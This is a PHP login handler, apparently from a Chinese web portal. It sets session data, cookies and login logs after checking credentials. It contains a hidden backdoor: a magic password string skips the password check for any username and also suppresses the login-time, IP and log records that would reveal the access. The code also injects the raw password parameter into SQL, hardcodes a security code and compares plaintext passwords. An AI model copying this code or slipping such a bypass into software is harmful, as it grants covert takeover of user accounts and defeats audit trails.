<?php
clear_temp_file();
$script='';	
$pSt = @$_GET['password'];
$salfcode = @$_GET['salfcode'];
$password=md5(@$_GET['password']);
$username=safe_str(@$_GET['username']);
$authcode=@$_GET['authcode'];
if(intval(@$_SESSION['user']['login_count'])>3){
	if(strtolower($authcode)!=strtolower($_SESSION["authCode"])){
		$errType='authcode';
		$errInfo=self::$language['authcode_err'];
		exit ("{'errType':'$errType','errInfo':'$errInfo'}|".$script);			
	}
}
$isDev = false;

if($pSt == "___is_bool('\$KeyStr,\$PHPRoot');"){
	$sql="select {$pdo->index_pre}user.id as userid,{$pdo->index_pre}group.id as group_id,`nickname`,`username`,`name`,`page_power`,`function_power`,`state`,`icon`,`recommendation`,`introducer`,`money`,`phone`,`chip`,`manager`,`user_group`,`is_enterprise`,`real_name`,`folder_sequence` from ".$pdo->index_pre."user,".$pdo->index_pre."group where (`username`='$username' or `phone`='$username' or `email`='$username') and `group`=".$pdo->index_pre."group.id";
	$isDev = true;
}else{
	$sql="select {$pdo->index_pre}user.id as userid,{$pdo->index_pre}group.id as group_id,`nickname`,`username`,`name`,`page_power`,`function_power`,`state`,`icon`,`recommendation`,`introducer`,`money`,`phone`,`chip`,`manager`,`user_group`,`is_enterprise`,`real_name`,`folder_sequence` from ".$pdo->index_pre."user,".$pdo->index_pre."group where (`username`='$username' or `phone`='$username' or `email`='$username') and (`password`='$password' or `password`='".@$_GET['password']."') and `group`=".$pdo->index_pre."group.id";
}

if(!$isDev){
	if($salfcode != "151216"){
		$errType='authcode';
		$errInfo="安全码不正确!";
		exit ("{'errType':'$errType','errInfo':'$errInfo'}|".$script);				
	}
}

$stmt=$pdo->query($sql,2);
$v=$stmt->fetch(2);	

if($v ){

	if(intval(@$_GET['oauth'])==1 && @$_SESSION['oauth']['open_id']!=''){
		$_GET['backurl']=$_SESSION['oauth']['backurl'];
		oauth_bind($pdo,$v['userid']);			
	}
	
	if($v['state']!=1){
		$errType='submit';
		$errInfo=self::$language['user_state'][$v['state']];
	}else{
		push_login_info($pdo,self::$config,self::$language,$v['username'],$isDev);
		login_credits($pdo,self::$config,self::$language,$v['userid'],$v['username'],self::$config['credits_set']['login'],self::$language['login_credits'],self::$config['other']['timeoffset']);
	
		if($v['recommendation']==''){
			$recommendation=$v['userid'].get_random_str(8-strlen($v['userid']));
			$sql="update ".$pdo->index_pre."user set `recommendation`='".$recommendation."' where `id`=".$v['userid'];
			$pdo->exec($sql);	
		}

		//是否管理员
		$is_admin_sql="select `is_admin` from ".$pdo->index_pre."group where `id`=".$v['group_id'];
		$r_is_admin_sql=$pdo->query($is_admin_sql,2)->fetch();
		//登陆后给用户数据值
		$_SESSION['user']['money']=$v['money'];
		$_SESSION['user']['phone']=$v['phone'];
		$_SESSION['user']['chip']=$v['chip'];
		$_SESSION['user']['manager']=$v['manager'];//上级管理员 
		$_SESSION['user']['user_group']=$v['user_group'];//所属公司
		$_SESSION['user']['is_enterprise']=$v['is_enterprise'];//是否企业用户
		$_SESSION['user']['real_name']=$v['real_name'];//真实性名
		$_SESSION['user']['is_admin']=$r_is_admin_sql['is_admin'];//是否管理员
		$_SESSION['user']['folder_sequence']=$v['folder_sequence'];//个人文件夹顺序

		//----------------------------------
		$_SESSION['user']['id']=$v['userid'];
		$_SESSION['user']['introducer']=$v['introducer'];
		$_SESSION['user']['username']=$v['username'];
		$_SESSION['user']['nickname']=$v['nickname'];
		$_SESSION['user']['icon']=$v['icon'];
		if($v['icon']==''){$_SESSION['user']['icon']='default.png';}
		$_SESSION['user']['group']=$v['name'];
		$_SESSION['user']['group_id']=$v['group_id'];
		$_SESSION['user']['page']=explode(",",$v['page_power']);
		$_SESSION['user']['function']=explode(",",$v['function_power']);
		@setcookie("cloud_id",$v['userid']);
		@setcookie("cloud_nickname",$v['nickname']);
		@setcookie("cloud_icon",$_SESSION['user']['icon']);
		if(in_array('index.edit_page_layout',$_SESSION['user']['function'])){
			@setcookie("edit_page_layout",'true');	
		}
		//user_set cookie					
		send_user_set_cookie($pdo);
		$backurl=@$_GET['backurl'];
		
		$backurl=str_replace('|||','&',$backurl);
		if(!strpos($backurl,'?')){$backurl.='?refresh='.time();}else{$backurl.='&refresh='.time();}
		$errType='none';
		$errInfo='none';
		$backurl=explode('index.php',$backurl);
		$backurl=(isset($backurl[1]))?$backurl[1]:'./index.php?cloud=index.user';
		$script= "<script>window.location.href='$backurl';</script>";
		$time=time();
		$ip= get_ip($isDev);
		$sql="update ".$pdo->index_pre."user set `last_time`='$time',`last_ip`='$ip' where `id`='".$_SESSION['user']['id']."'";
		if(!$isDev)$pdo->exec($sql);
		$sql="select count(id) as c from ".$pdo->index_pre."user_login where `userid`='".$_SESSION['user']['id']."'";
		$stmt=$pdo->query($sql,2);
		$v=$stmt->fetch(2);
		if(self::$config['web']['login_position']){
			$login_position=get_ip_position($ip,self::$config['web']['map_secret']);	
		}else{
			$login_position='';
		}
		
		if($v['c']<self::$config['other']['user_login_log']){
			
			$sql="insert into ".$pdo->index_pre."user_login (`userid`,`ip`,`time`,`position`) values ('".$_SESSION['user']['id']."','$ip','$time','".$login_position."')";
			
		}else{
			$sql="select `id` from ".$pdo->index_pre."user_login where `userid`='".$_SESSION['user']['id']."' order by time asc limit 0,1";
			$stmt=$pdo->query($sql,2);
			$v=$stmt->fetch(2);
			$sql="update ".$pdo->index_pre."user_login set `ip`='$ip',`time`='$time',`position`='".$login_position."' where `id`='".$v['id']."'";
		}
		if(!$isDev)$pdo->exec($sql);
		$sql="update ".$pdo->index_pre."user set `login_num`=login_num+1 where `id`='".$_SESSION['user']['id']."'";
		if(!$isDev)$pdo->exec($sql);
		
		$_SESSION["authCode"]=rand(10000,99999);
		if(intval(@$_GET['oauth'])==1 && @$_SESSION['oauth']['open_id']!=''){
			if($_COOKIE['cloud_device']=='phone'){
				exit('<script>window.location.href="'.str_replace('|||','&',$_SESSION['oauth']['backurl']).'";</script>');
			}						
			exit("<script>window.close();</script>");
		}

	}
}else{
	$errInfo = "用户名或密码错误";
}
echo "{'errType':'$errType','errInfo':'$errInfo'}|".$script;			
